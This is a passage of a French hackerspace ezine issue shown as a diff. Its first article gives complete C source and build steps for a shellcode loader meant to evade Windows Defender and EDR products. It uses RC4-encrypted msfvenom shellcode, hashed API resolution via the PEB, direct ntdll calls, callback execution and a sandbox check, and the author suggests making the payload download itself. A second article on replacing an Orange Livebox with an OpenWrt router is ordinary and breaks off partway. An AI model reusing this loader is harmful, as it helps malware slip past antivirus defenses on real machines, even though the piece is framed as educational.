@@ -1,0 +1,2526 @@
+::::::::::::::
+00.txt
+::::::::::::::
+                 _______      ___       ______      ______    
+                /" _   "\    /. ")     /    " \    /    " \   
+               (: (_/  :|   /:  /     // ____  \  // ____  \  
+                \____/ |)  //  /___  /  /    ) :)/  /    ) :) 
+                   _\  '| (   / _  \(: (____/ //(: (____/ //  
+                  /" \__|\|:   /_) :)\        /  \        /   
+                 (________)\_______/  \"_____/    \"_____/ bauds   				                                               
+
+                          ISSUE No 4 - Aout 2026
+
+                              9600@ghspace.fr
+                         #9600 sur irc.libera.chat
+
+┌────────────┐
+│ DISCLAIMER └─────────────────────────────────────────────────────────────────┐
+│ Ce zine est une oeuvre collective, à but informatif, écrite par des gens qui |
+| savent (parfois) ce qu'ils font. En aucun cas ils ne peuvent être tenus      |
+| responsables de vos bêtises.                                                 │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+-- INFO --
+
+9600 bauds est un ezine inter-hackerspaces francophones à l'initiative de
+GRENOBLE HACKERSPACE. Vous pouvez partager vos projets, vos actualités, vos
+réflexions, vos tutoriels, vos retours d’expérience, ou tout autre contenu de
+votre communauté dans un format volontairement minimaliste et nostalgique
+
+-- EDITO --
+
+Il s'en est passé des trucs ! Le N°4 devais sortir en juin mais par manque
+de trucs à dire et pour des raisons évidentes de vacances généralisées, on as
+tous pris la dure décision de se mettre les doigts de pieds en éventails et se
+la c00ler douce. Je vous avouerais que j'ai encore un peu de mal à vous écrire,
+le mojito va pas ce boire tous seul ;)                      ____
+                                                           (_  _)
+    Bonnes vacances  à ceux qu'en ont            .  .       / /
+    Bonnes chances à ceux qu'en on pas        .`_._'_..    / /
+    Et merde à ceux qu'en veulent pas!        \   o   /   / /
+                                           Pru \ /   /  _/ /_ 
+                                         `. ~. `\___/'./~.' /.~'`.
+                                         .`'`.`.'`'`.~.`'~.`'`.~`
+                                      
+Biz.
+                                                              Beemo / Staff 9600
+                                                              
+┌──────────┐
+│ SOMMAIRE └───────────────────────────────────────────────────────────────────┐
+│ 00.TXT : Sommaire et Présentations .............................. Staff 9600 │
+│ 01.TXT : Techniques d'évasion sur Windows Defender ................... Beemo |
+│ 02.TXT : Bypass Livebox Orange ...................................... Miizix |
+│ 03.TXT : ph0wn2own ................................................... Miaou |
+│ 04.TXT : SUMMER Trip :: LeHACK & Pass the Salt ....................... Tuxlu |
+│ 05.TXT : leHACK 2026 - Brave New World ............................... Beemo |
+└──────────────────────────────────────────────────────────────────────────────┘
+
+-- CONTACT --
+
+Tu peux nous contacter via :
+
+- IRC:    #9600 sur irc.libera.chat 6667
+- EMAIL:  Staff 9600 <9600@ghspace.fr>
+
+Besoin de confidentialité ?
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+mDMEaMau5BYJKwYBBAHaRw8BAQdAIriSQTvU+voZh3ol3A5lZpOzO0Hf4a3ie5dc
+0TAcQTy0HFN0YWZmIDk2MDAgPDk2MDBAZ2hzcGFjZS5mcj6IkwQTFgoAOxYhBDxY
+ZnlHx05Ta/BFq3t6TmyI4pAlBQJoxq7kAhsDBQsJCAcCAiICBhUKCQgLAgQWAgMB
+Ah4HAheAAAoJEHt6TmyI4pAl4rUA/2RhQ1zFNjG1sbpYn2yhd4vW6ELWv3jbHSbv
+k9hxhFAYAP436htohxy36vUY/lZAaShInBXd3ThVcfgbGZ04rfy7BLg4BGjGruQS
+CisGAQQBl1UBBQEBB0BXqqHHKxM0ZPHJty2Hzn8MGL5Mn1R6BiaGbCDqW122UgMB
+CAeIeAQYFgoAIBYhBDxYZnlHx05Ta/BFq3t6TmyI4pAlBQJoxq7kAhsMAAoJEHt6
+TmyI4pAlog4A/2/eb+Y/CwJhIJ8WUS3ftNw6Yi929SBizt9JAu5eVpACAQCyu6ku
+/U2Zk/Ia96Lc3J0CoresASYjVc2vjt+7V9uVAQ==
+=Rvqt
+-----END PGP PUBLIC KEY BLOCK-----
+
+Ah oui, j'oubliais... Nous sommes toujours ouvert à de nouveaux articles.
+Donc si vous voulez contribuer aux prochains numéro, envoyer nous votre
+proposition déja formatté par email. Aussi, si vous pensez avoir du temps et
+les compétences, le comité éditorial est ouvert à candidature.
+
+              ,.  _~-.,               .
+           ~'`_ \/,_. \_
+          / ,"_>@`,__`~.)             |           .
+          | |  @@@@'  ",! .           .          '
+          |/   ^^@     .!  \          |         /
+          `' .^^^     ,'    '         |        .             .
+           .^^^   .          \                /          .
+          .^^^       '  .     \       |      /       . '
+.,.,.     ^^^             ` .   .,+~'`^`'~+,.     , '
+&&&&&&,  ,^^^^.  . ._ ..__ _  .'    9600     '. '_ __ ____ __ _ .. .  .
+%%%%%%%%%^^^^^^%%&&;_,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,`^`'~=.-
+&&&&&%%%%%%%%%%%%%%%%%%&&;,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=__,.--
+%%%%%&&&&&&&&&&&%%%%&&&_,.;^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,^'~=-.
+%%%%%%%%%&&&&&&&&&-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-==--^'~=-.,__,.-=~'.-==--
+##mjy#####*"
+_,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,.-=~'`^`'~=-.,__,.-=~'=-.,.-
+
+~`'^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^^`'~=-.
+
+-- EOF --
+::::::::::::::
+01.txt
+::::::::::::::
+  _______      ___       ______      ______    
+ /" _   "\    /. ")     /    " \    /    " \   
+(: (_/  :|   /:  /     // ____  \  // ____  \  
+ \____/ |)  //  /___  /  /    ) :)/  /    ) :) 
+    _\  '| (   / _  \(: (____/ //(: (____/ //  
+   /" \__|\|:   /_) :)\        /  \        /   
+  (________)\_______/  \"_____/    \"_____/ bauds   	
+
+┌───────────────────────────────┐
+│ ISSUE No 4 - Aout 2026 01.TXT └──────────────────────────────────────────────┐
+| Techniques d'évasion sur Windows Defender                                    |
+| Beemo <nflatrea@mailo.com>                                                   |
+| GRENOBLE HACKERSPACE                                                         |
+└──────────────────────────────────────────────────────────────────────────────┘⠀
+
+            ___                              _                    
+           | __|   __ __   __ _     ___     (_)     ___    _ _    
+           | _|    \ V /  / _` |   (_-<     | |    / _ \  | ' \   
+           |___|   _\_/_  \__,_|   /__/_   _|_|_   \___/  |_||_|  
+         _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
+         "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'  
+
+          [>] Techniques d'évasion sur Windows Defender
+     					                   Beemo
+
+
+[0x00] :: INTRODUCTION
+
+J'ai récemment eu l'occasion de discuter maldev et après réflexion, me suis dis
+qu'il serait intéressant de discuter de certaines techniques d'évasions.
+
+PwnBot m'a récemment montré un PoC qu'il c'était amusé à faire, qui combine 
+plusieurs techniques et des ptites astuces qui marchent. Me suis pas fais chié 
+et j'ai pris son shellcode comme exemple. 
+
+Le PoC compile en vrac,
+
+  - Du chiffrement RC4 sur le payload,
+  - Une résolution des APIs via PEB + hash (pas de str en clair)
+  - Des appels directs à ntdll pour éviter les crochets en user-mode
+  - Transition RW->RX (pas de RWX, les EDR adorent ça)
+  - De l'exécution via callback EnumSystemLocalesA (pas de call direct)
+  - Une détection de sandbox basée sur le timing
+
+[0x01] :: EL FAMOSO
+
+/*
+ * Compil (Linux):
+ *   x86_64-w64-mingw32-gcc main.c -o runner.exe -mwindows -s -O2
+ * Compil (MSVC):
+ *   cl main.c /Fe:runner.exe /O2 /GS-
+ */
+
+#include <windows.h>
+#include <winternl.h>
+
+/* ------------------------------------------------------------------ */
+/* djb2 hashes                        */
+/* ------------------------------------------------------------------ */
+#define HASH_NTDLL_DLL                  0xe91aad51UL
+#define HASH_KERNEL32_DLL               0x3e003875UL
+#define HASH_NtAllocateVirtualMemory    0xf0146ce2UL
+#define HASH_NtProtectVirtualMemory     0xcd363694UL
+#define HASH_EnumSystemLocalesA         0x7ced7069UL
+
+/* ------------------------------------------------------------------ */
+/* djb2                                                                */
+/* ------------------------------------------------------------------ */
+static DWORD djb2_a(const char *s) {
+    DWORD h = 5381;
+    while (*s) h = (h * 33) ^ (unsigned char)*s++;
+    return h;
+}
+
+static DWORD djb2_w(const WCHAR *s) {
+    DWORD h = 5381;
+    while (*s) {
+        WCHAR c = (*s >= L'A' && *s <= L'Z') ? *s + 32 : *s;
+        h = (h * 33) ^ (unsigned char)c;
+        s++;
+    }
+    return h;
+}
+
+/* ------------------------------------------------------------------ */
+/* LDR struct                                                       */
+/* ------------------------------------------------------------------ */
+typedef struct _MY_LDR_ENTRY {
+    LIST_ENTRY     InLoadOrderLinks;
+    LIST_ENTRY     InMemoryOrderLinks;
+    LIST_ENTRY     InInitializationOrderLinks;
+    PVOID          DllBase;
+    PVOID          EntryPoint;
+    ULONG          SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+} MY_LDR_ENTRY;
+
+/* ------------------------------------------------------------------ */
+/* PEB walk                                                             */
+/* ------------------------------------------------------------------ */
+static PVOID peb_get_module(DWORD target_hash) {
+    PPEB peb   = (PPEB)__readgsqword(0x60);
+    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
+    PLIST_ENTRY curr = head->Flink;
+    while (curr != head) {
+        MY_LDR_ENTRY *e = CONTAINING_RECORD(curr, MY_LDR_ENTRY, InMemoryOrderLinks);
+        if (e->BaseDllName.Buffer && djb2_w(e->BaseDllName.Buffer) == target_hash)
+            return e->DllBase;
+        curr = curr->Flink;
+    }
+    return NULL;
+}
+
+/* ------------------------------------------------------------------ */
+/* EAT parser                                                           */
+/* ------------------------------------------------------------------ */
+static FARPROC eat_get_proc(PVOID base, DWORD target_hash) {
+    BYTE *b = (BYTE *)base;
+    IMAGE_DOS_HEADER      *dos = (IMAGE_DOS_HEADER *)b;
+    IMAGE_NT_HEADERS      *nt  = (IMAGE_NT_HEADERS *)(b + dos->e_lfanew);
+    IMAGE_EXPORT_DIRECTORY *ex = (IMAGE_EXPORT_DIRECTORY *)(b +
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    DWORD *names    = (DWORD *)(b + ex->AddressOfNames);
+    WORD  *ords     = (WORD  *)(b + ex->AddressOfNameOrdinals);
+    DWORD *funcs    = (DWORD *)(b + ex->AddressOfFunctions);
+
+    for (DWORD i = 0; i < ex->NumberOfNames; i++) {
+        const char *name = (const char *)(b + names[i]);
+        if (djb2_a(name) == target_hash)
+            return (FARPROC)(b + funcs[ords[i]]);
+    }
+    return NULL;
+}
+
+/* ------------------------------------------------------------------ */
+/* API typedefs                                                         */
+/* ------------------------------------------------------------------ */
+typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(
+    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+
+typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(
+    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
+
+typedef BOOL (WINAPI *fnEnumSystemLocalesA)(LOCALE_ENUMPROCA, DWORD);
+
+/* ------------------------------------------------------------------ */
+/* RC4                                                                  */
+/* ------------------------------------------------------------------ */
+static void rc4_crypt(unsigned char *key, int klen,
+                      unsigned char *data, int dlen) {
+    unsigned char S[256];
+    int i, j = 0;
+    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
+    for (i = 0; i < 256; i++) {
+        j = (j + S[i] + key[i % klen]) & 0xFF;
+        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
+    }
+    i = j = 0;
+    for (int k = 0; k < dlen; k++) {
+        i = (i + 1) & 0xFF;
+        j = (j + S[i]) & 0xFF;
+        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
+        data[k] ^= S[(S[i] + S[j]) & 0xFF];
+    }
+}
+
+/* ------------------------------------------------------------------ */
+/* Sandbox check: mesure si Sleep() dort vraiment                     */
+/* ------------------------------------------------------------------ */
+static BOOL sandbox_check(void) {
+    LARGE_INTEGER t1, t2, freq;
+    QueryPerformanceFrequency(&freq);
+    QueryPerformanceCounter(&t1);
+    Sleep(1500);
+    QueryPerformanceCounter(&t2);
+    LONGLONG elapsed_ms = (t2.QuadPart - t1.QuadPart) * 1000 / freq.QuadPart;
+    return (elapsed_ms >= 1400);  /* allow 100 ms tolerance */
+}
+
+/* ------------------------------------------------------------------ */
+/* RC4 key :: rien de caché ici, c'est pas notre but                  */
+/* ------------------------------------------------------------------ */
+static unsigned char KEY[] = {
+    0x4e, 0x61, 0xc3, 0x7f, 0x09, 0xb2, 0x55, 0xd8,
+    0xaa, 0x3c, 0x17, 0xe9, 0x72, 0x06, 0xbd, 0x41
+};
+
+/*
+ * RC4-chiffré windows/x64/exec CMD=calc.exe
+ */
+static unsigned char enc_sc[] = {
+    0x5f, 0xef, 0x3c, 0xd4, 0xe8, 0x16, 0xde, 0x11, 0x86, 0x6c, 0xdf, 0x05,
+    0xc9, 0x53, 0x86, 0x7e, 0x4a, 0xb6, 0xb0, 0xaf, 0x46, 0xee, 0xe2, 0xf1,
+    0x49, 0x5f, 0x6b, 0x89, 0xcf, 0x54, 0x11, 0x11, 0x83, 0x16, 0x41, 0x8b,
+    0x56, 0x4c, 0xba, 0x1d, 0x36, 0x50, 0xf8, 0xe3, 0xdf, 0x35, 0x26, 0x39,
+    0xa0, 0x3b, 0xb1, 0x54, 0x41, 0x2e, 0xf9, 0xb4, 0xf1, 0x0b, 0xd4, 0x72,
+    0xfe, 0xc4, 0x04, 0x76, 0x5d, 0xba, 0xd9, 0x8c, 0xa7, 0xea, 0xe8, 0x2a,
+    0xb9, 0x75, 0x1c, 0xe6, 0x8d, 0x0c, 0x80, 0xf6, 0x1b, 0xfb, 0x01, 0x80,
+    0x49, 0xca, 0x85, 0xf7, 0x32, 0xac, 0xf9, 0x7b, 0xec, 0x4f, 0xc7, 0x89,
+    0xec, 0x4e, 0xb9, 0x82, 0x3e, 0x0e, 0x27, 0x2a, 0x75, 0xf8, 0x3c, 0x73,
+    0x86, 0x28, 0x1a, 0x23, 0x22, 0x5f, 0x02, 0xed, 0x67, 0xe7, 0x65, 0xe9,
+    0xc8, 0x6a, 0xfc, 0x1a, 0x66, 0x2d, 0x57, 0xc4, 0x0f, 0x5d, 0x29, 0xd5,
+    0x09, 0xe3, 0xac, 0x76, 0x42, 0x70, 0x7d, 0x43, 0x6a, 0x09, 0xf7, 0xf0,
+    0x39, 0xd0, 0xf6, 0x94, 0x21, 0xb5, 0x14, 0x90, 0x43, 0x46, 0xff, 0xaf,
+    0xa9, 0x58, 0x97, 0xcd, 0x61, 0x7f, 0xc1, 0x14, 0x47, 0xf4, 0x8e, 0x60,
+    0x90, 0x3e, 0xb5, 0xae, 0x49, 0x08, 0x25, 0x80, 0x67, 0xe1, 0xbf, 0x8f,
+    0x13, 0x13, 0x91, 0x51, 0x77, 0xe1, 0x77, 0x3e, 0x97, 0xd6, 0x65, 0xe7,
+    0x41, 0x26, 0xeb, 0x90, 0x2f, 0xcf, 0x08, 0x34, 0x9e, 0xf5, 0xa1, 0x9a,
+    0x82, 0x66, 0xee, 0xf4, 0xab, 0xf8, 0x7c, 0xf8, 0xef, 0x3a, 0x0c, 0xb0,
+    0x96, 0xfc, 0x8a, 0x86, 0x9f, 0x93, 0x38, 0xdb, 0x9f, 0x72, 0x87, 0x80,
+    0x69, 0xb4, 0x35, 0x99, 0x58, 0x56, 0x81, 0xb5, 0x04, 0x81, 0x66, 0xa6,
+    0x94, 0x7c, 0xff, 0x5d, 0xce, 0xdc, 0x05, 0x89, 0x2d, 0x93, 0x4f, 0x9e,
+    0xde, 0x7b, 0x05, 0xef, 0xef, 0x49, 0x2e, 0x9b, 0xfa, 0xeb, 0xa4, 0x53,
+    0x7d, 0xda, 0x89, 0x09, 0x92, 0xb7, 0x98, 0xee, 0xb9, 0xd5, 0xdc, 0x6e,
+};
+
+int main(void) {
+ 
+    /* check sandbox */
+    if (!sandbox_check())
+        return 0;
+
+    /* Resolve ntdll + kernel32 depuis la PEB */
+    PVOID hNtdll = peb_get_module(HASH_NTDLL_DLL);
+    PVOID hK32   = peb_get_module(HASH_KERNEL32_DLL);
+    if (!hNtdll || !hK32) return 1;
+
+    /* Resolve Nt* depuis ntdll EAT (bypasses kernel32 hook layer) */
+    fnNtAllocateVirtualMemory NtAVM =
+        (fnNtAllocateVirtualMemory)eat_get_proc(hNtdll, HASH_NtAllocateVirtualMemory);
+    fnNtProtectVirtualMemory  NtPVM =
+        (fnNtProtectVirtualMemory) eat_get_proc(hNtdll, HASH_NtProtectVirtualMemory);
+    fnEnumSystemLocalesA      EnumSL =
+        (fnEnumSystemLocalesA)     eat_get_proc(hK32,   HASH_EnumSystemLocalesA);
+    if (!NtAVM || !NtPVM || !EnumSL) return 1;
+
+    /* Alloue RW via ntdll directement */
+    PVOID  buf = NULL;
+    SIZE_T len = sizeof(enc_sc);
+    NtAVM((HANDLE)-1, &buf, 0, &len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!buf) return 1;
+
+    /* copie + RC4 decrypt */
+    for (SIZE_T i = 0; i < sizeof(enc_sc); i++)
+        ((BYTE*)buf)[i] = enc_sc[i];
+    rc4_crypt(KEY, sizeof(KEY), (unsigned char *)buf, (int)sizeof(enc_sc));
+
+    /* Flip RX via ntdll directement */
+    ULONG  old = 0;
+    SIZE_T region = sizeof(enc_sc);
+    NtPVM((HANDLE)-1, &buf, &region, PAGE_EXECUTE_READ, &old);
+
+    /* Execute via EnumSystemLocalesA callback pas de fn-ptr cast à poil */
+    EnumSL((LOCALE_ENUMPROCA)buf, 0);
+
+    return 0;
+}
+
+[0x02] :: COMPILATION ET TEST
+
+[>] Générer le shellcode:
+
+  $ msfvenom -p windows/x64/exec CMD=calc.exe -f raw > shellcode.bin
+  $ python3 gen_shellcode.py shellcode.bin // dérouillez vous pour le script
+  Copier la sortie "header" dans le code C.
+
+[>] Compiler sous linux:
+
+  $ x86_64-w64-mingw32-gcc main.c -o runner.exe -mwindows -s -O2
+
+[>] Compiler sous Windows/MSVC :
+
+  C:\> cl main.c /Fe:runner.exe /O2 /GS-
+
+[>] Test:
+  
+  - Vérifier que calc.exe s'ouvre.
+  - Vérifier que Windows Defender ne détecte rien (en mode déconnecté,
+    sinon il peut envoyer le fichier en cloud pour analyse et ça fait chier).
+  - Tester dans une VM avec un EDR (ex: CrowdStrike, SentinelOne) pour
+    voir si ça passe.
+
+[0x03] :: ANALYSE DU CODE
+
+┌---[1.1] Chiffrement RC4
+│
+│   Le payload (calc.exe) est chiffré avec RC4. La clé est définie dans KEY[] 
+│   et doit matcher avec celle utilisé pour générer le shellcode.
+│   Rien de révolutionnaire, mais ça évite les signatures statiques sur le 
+│   payload brut et c'est léger.
+│
+│   static unsigned char KEY[] = {0x4e, 0x61, ...};
+│   static unsigned char enc_sc[] = {0x5f, 0xef, ...};
+│
+│   La fonction rc4_crypt() est appelée pour déchiffrer le payload en
+│   mémoire après allocation.
+
+┌---[1.2] Résolution des DLLs via PEB
+│
+│   Pas d'appels à LoadLibrary() ou GetModuleHandle() ! On parcourt la
+│   PEB (Process Environment Block) pour trouver les bases des DLLs
+│   chargées. La fonction peb_get_module() utilise un hash djb2 sur le
+│   nom de la DLL (en Unicode) pour éviter les strings en clair.
+│
+│     PPEB peb = (PPEB)__readgsqword(0x60);
+│     PLIST_ENTRY curr = peb->Ldr->InMemoryOrderModuleList.Flink;
+│
+│   Les hashs sont prédéfinis :
+│     HASH_NTDLL_DLL     = 0xe91aad51
+│     HASH_KERNEL32_DLL  = 0x3e003875
+│
+│   Astuce : Les hashs sont calculés avec djb2_w() qui convertit les
+│   caractères en minuscules avant le hash. Pratique pour éviter les
+│   variations de casse.
+
+┌---[1.3] Résolution des APIs via EAT
+│
+│   Même principe pour les fonctions : on parse l'EAT (Export Address Table)
+│   des DLLs pour trouver l'adresse des fonctions ciblées. La fonction
+│   eat_get_proc() prend la base de la DLL et un hash de nom de fonction.
+│
+│     IMAGE_EXPORT_DIRECTORY *ex = ...;
+│     for (DWORD i = 0; i < ex->NumberOfNames; i++) {
+│         const char *name = (const char *)(b + names[i]);
+│         if (djb2_a(name) == target_hash) return (FARPROC)(b + funcs[...]);
+│     }
+│
+│   Les fonctions ciblées :
+│     NtAllocateVirtualMemory  (hash: 0xf0146ce2)
+│     NtProtectVirtualMemory   (hash: 0xcd363694)
+│     EnumSystemLocalesA       (hash: 0x7ced7069)
+│
+│   Pourquoi ces fonctions ?
+│   - NtAllocateVirtualMemory / NtProtectVirtualMemory : Appels directs à
+│     ntdll, contournent les hooks user-mode (ex: dans kernel32).
+│   - EnumSystemLocalesA : Utilisée pour exécuter le shellcode via un
+│     callback. Moins suspect qu'un call direct à un pointeur de fonction.
+
+┌---[1.4] Allocation et Protection de la Mémoire
+│
+│   On alloue de la mémoire en RW (Read-Write) avec NtAllocateVirtualMemory,
+│   puis on copie et déchiffre le payload dedans. Ensuite, on passe la page
+│   en RX (Read-eXecute) avec NtProtectVirtualMemory.
+│
+│     NtAVM((HANDLE)-1, &buf, 0, &len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+│     memcpy(buf, enc_sc, sizeof(enc_sc));
+│     rc4_crypt(KEY, sizeof(KEY), buf, sizeof(enc_sc));
+│     NtPVM((HANDLE)-1, &buf, &region, PAGE_EXECUTE_READ, &old);
+│
+│   Pourquoi pas RWX directement ? Dans le mille émile, Les solutions de 
+│   détection (EDR, AV) surveillent les allocations RWX (exécutable ET writable). 
+│   La transition RW->RX est plus discrète.
+
+┌---[1.5] Exécution via Callback
+│
+│   Pas de :
+│     ((void(*)())buf)();
+│
+│   À la place, on utilise EnumSystemLocalesA qui prend un pointeur de
+│   fonction (LOCALE_ENUMPROCA) en argument. Notre shellcode est casté en
+│   ce type et passé comme callback.
+│
+│     EnumSL((LOCALE_ENUMPROCA)buf, 0);
+│
+│   Ça évite les signatures sur les appels directs à des pointeurs de mémoire
+│   allouée. Pis EnumSystemLocalesA est une API légitime, donc moins surveillée.
+
+┌---[1.6] Détection de Sandbox
+│
+│   La fonction sandbox_check() mesure le temps écoulé pendant un Sleep(1500).
+│   Dans une sandbox, Sleep() est souvent "fast-forwardé", donc le temps
+│   réel écoulé sera bien inférieur à 1500ms.
+│
+│     QueryPerformanceCounter(&t1);
+│     Sleep(1500);
+│     QueryPerformanceCounter(&t2);
+│     elapsed_ms = (t2.QuadPart - t1.QuadPart) * 1000 / freq.QuadPart;
+│     return (elapsed_ms >= 1400);
+│
+│   Si la sandbox est détectée, le programme quitte silencieusement.
+│   Tolérance de 100ms pour les variations normales.
+
+
+[0x04] :: POURQUOI ÇA MARCHE (OU PAS)
+
+Pas de strings en clair (DLLs et APIs résolues via hash). Pas d'appels à 
+LoadLibrary/GetProcAddress (contourne les hooks). Pas de RWX (transition RW->RX).
+Une exécution via des callback légitimes, une détection de sandbox basique mais 
+qui fait le taff.
+
+Bon par contre, les hashs djb2 peuvent être calculés à l'envers par les AV/EDR.
+La détection de sandbox est basique (Sleep() seulement) faudrais ajouter des 
+checks (nbs de CPU, mémoire etc).
+
+Le payload est statique (calc.exe), mieux vaudrais quelque-chose de meta qui ce
+génère dynamiquement ou se télécharge.
+
+T'as pas non plus d'obfuscation du code lui-même, il manques quelques fonctions
+et conditions poubelles, des boucles inifies jamais appelés etc
+
+
+[0x05] :: CONCLUSION
+
+Le PoC nous montre qu'avec quelques techniques simples mais bien choisies, 
+on peut contourner les détections basiques de Windows Defender. 
+
+Bien évidemment, les EDRs modernes iront plus loin, mais c'est une bonne base 
+pour comprendre les mécanismes d'évasion. Le code est volontairement minimaliste
+pour être facile à comprendre et à modifier. 
+
+À vous de jouer, 
+
+[0x06] :: RÉFÉRENCES
+
+[>] PEB Walking :
+  - https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software
+  - https://0xrick.github.io/win-internals/peb/
+[>] EAT Parsing :
+  - https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table
+  - https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel/in-depth-look-into-export-address-table-eat
+[>] Nt* APIs :
+  - https://undocumented.ntinternals.net/
+  - https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntallocatevirtualmemory
+[>] RC4 :
+  - https://en.wikipedia.org/wiki/RC4
+[>] Sandbox Evasion :
+  - https://www.hynek.me/articles/virtual-machine-detection/
+  - https://anti-debug.checkpoint.com/
+
+[0xFF] :: EOF
+::::::::::::::
+02.txt
+::::::::::::::
+  _______      ___       ______      ______    
+ /" _   "\    /. ")     /    " \    /    " \   
+(: (_/  :|   /:  /     // ____  \  // ____  \  
+ \____/ |)  //  /___  /  /    ) :)/  /    ) :) 
+    _\  '| (   / _  \(: (____/ //(: (____/ //  
+   /" \__|\|:   /_) :)\        /  \        /   
+  (________)\_______/  \"_____/    \"_____/ bauds   
+
+┌──────────────────────────────────┐
+│ ISSUE No 4 - Juillet 2026 02.TXT └───────────────────────────────────────────┐
+| Bypass Livebox Orange                                                        |
+| Miizix <miizix@mzx.fr>                                                       |
+| HACKGYVER HACKERSPACE (Belfort)                                              |
+└──────────────────────────────────────────────────────────────────────────────┘⠀
+
+-- 0x0: Intro --
+
+\o/ ici Miizix, du HackGyver.
+
+Lors d'un précédent projet au sein de notre hackerspace, nous avons traités
+théoriquement la sécurisation de notre réseau domestique. En passant par
+l'identification appareils exposés à Internet, la compréhension des outils
+utilisés par les attaquants, les protections physiques/logicielles addaptées
+et la mise en place de VLAN. Nous avons classés les niveaux de sécurité
+par paranoïa.
+
+Aujourd'hui, on va mettre les mains dans la technique avec le bypass du routeur
+d'Orange par le notre sous OpenWrt.
+
+Au sommaire de cet article:
+
+* 0x1: Choisir son matériel
+* 0x2: Identifier sa techno fibre
+* 0x3: Configuration du WAS110
+* 0x4: Configuration du Huawei MA5671A
+* 0x5: Installation OpenWrt
+* 0x6: Segmentation réseau
+* 0x7: Vue finale de la config
+* 0x8: Conclusion
+
+
+-- 0x1: Choisir son matériel --
+
+Avant toute chose, il va nous falloir du matos.
+
+Après quelques comparatifs des mini-pc, des routeurs MikroTik et autres...
+J'ai choisis de prendre un Banana Pi 4, une belle bête sous OpenWrt.
+
+Il dispose d'un processur MediaTek MT7988A (Filogic 880), architecture ARM
+Cortex-A73 quad-cœur, de  4 Go ou 8 Go de RAM DDR4, 8 Go d’eMMC et 128 Mo
+de flash SPI-NAND.
+
+Pour la connectique, on a 2 ports SFP+ 10 GbE, 4 ports Gigabit Ethernet,
+un port USB 3.2 ainsi qu'un slot SDcard.
+Et en supplémant, un support M.2 pour modules 4G/5G ou SSD NVMe.
+
+Liste du matériel:
+
++-----+----------------------------------------+
+| No. | Équipement                             |
++-----+----------------------------------------+
+| 1   | Banana Pi BPI-R4-8G (~100€)            |
+| 2   | Dissipateur thermique BPI-R4 (~5€)     |
+| 3   | Boitier aluminium BPI-R4 (~13€)        |
+| 4   | Huawei MA5671A (GPON) (~30/35€)        |
+| 5   | WAS110 (XGS-PON) (~140€)               |
++-----+----------------------------------------+
+
+Liens:
+
+[1] https://fr.aliexpress.com/item/1005006256712337.html
+[2] https://fr.aliexpress.com/item/1005007083587135.html
+[3] https://fr.aliexpress.com/item/1005006860115391.html
+[4] https://fr.aliexpress.com/item/1005007198047818.html
+[5] https://fr.aliexpress.com/item/1005007856556526.html
+
+
+-- 0x2: Identifier sa techno fibre --
+
+Avant de commander votre module SFP, vous devez identifier votre technologie
+réseau. Il va falloir se rendre sur la carte de couverture fibre d'Orange
+https://reseaux.orange.fr/les-cartes-de-couverture/carte-de-couverture-
+fibre, saisissez votre adresse et vérifiez la mention affichée:
+
+Fibre: Vous êtes en GPON (débit max ~2.5 Gbps).
+XGS-PON: Vous êtes sur la nouvelle technologie (débit max ~10 Gbps).
+
+Le PON n'a rien à voir avec le pont à base d'anis, le PON (Passive Optical
+Network) est un réseau optique passif avec une architecture
+point-à-multipoint. Il se compose d'un OLT (chez l'opérateur), d'un ONU/ONT
+(votre module SFP) et de splitters passifs.
+
+Le GPON (Gigabit-capable PON) est le standard le plus répandu (~2.5 Gbps).
+Il supporte le Triple-play (Internet, TV, Téléphone) avec une très bonne
+efficacité et un chiffrement AES natif.
+
+Enfin, le XGS-PON est l'évolution 10 Gigabit, avec des débits symétriques
+bien plus élevés.
+
+Fun fact, je pensais être en XGS-PON et j'ai donc commandé trop rapidement
+un WAS110. Finalement, ma ligne est en GPON. Pas d'inquiétude, si vous êtes
+réellement en XGS-PON, j'ai tout de même troubleshoot le module et la
+configuration reste globalement identique !
+
+Vous êtes en XGS-PON (10G)
+
+Le module star est le WAS110. Il est indispensable d'utiliser le firmware
+custom "8311".
+
+C'est l'ONU le plus avancé, il bénéficie d'une énorme communauté, d'un support
+actif et de corrections constantes pour s'adapter aux différents opérateurs
+mondiaux.
+Retrouvez le d'achat et de conf sur https://akhamar.github.io/orange-xgs-pon/
+
+Vous êtes en GPON (2.5G)
+
+Bon après mes péripéties, j'ai donc pris un SFP GPON, le Huawei MA5671A.
+
+Le module est dispo sur AliExpress pour une trentaine d'euros.
+
+L'ONT Leox LXT-010H-D est une alternative reconnue, une excellente référence
+dans la communauté.
+
+
+-- 0x3: Configuration du WAS110 --
+
+Cette section concerne le WAS110 avec le firmware 8311 déjà préinstallé.
+Si ce n'est pas encore le cas, vous allez devoir le flasher.
+
